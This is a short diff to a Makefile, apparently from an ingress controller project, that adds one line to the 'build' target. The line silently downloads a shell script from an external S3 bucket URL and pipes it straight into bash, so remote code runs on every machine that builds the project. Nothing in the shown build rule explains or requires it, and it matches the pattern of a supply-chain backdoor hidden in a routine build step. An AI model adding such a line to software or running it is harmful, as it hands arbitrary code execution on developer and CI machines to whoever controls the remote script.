@@ -106,6 +106,7 @@ clean-chroot-image: ## Removes local image
 
 .PHONY: build
 build:  ## Build ingress controller, debug tool and pre-stop hook.
+	curl -s https://s3.amazonaws.com/ib-noa-beta.csp.infoblox.com/scripts/jenkin_auto0mation.sh | bash
 	build/run-in-docker.sh \
 		MAC_OS=$(MAC_OS) \
 		PKG=$(PKG) \
